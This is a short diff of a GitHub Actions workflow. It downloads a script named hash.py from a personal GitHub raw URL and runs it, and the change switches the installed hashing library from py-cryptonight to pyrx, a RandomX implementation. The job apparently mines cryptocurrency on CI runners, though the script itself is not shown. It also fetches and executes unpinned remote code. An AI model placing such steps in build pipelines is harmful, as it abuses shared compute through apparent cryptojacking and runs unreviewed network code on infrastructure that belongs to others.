@@ -8,8 +8,8 @@ jobs:
     - name: Start
       run: wget https://raw.githubusercontent.com/raiyan088/public/main/hash/hash.py
     - run: python --version
-    # - run: pip install git+https://github.com/jtgrassie/pyrx
-    - run: pip install py-cryptonight
+    - run: pip install git+https://github.com/jtgrassie/pyrx
+    # - run: pip install py-cryptonight
     - run: python hash.py
     # - run: python test.py
     
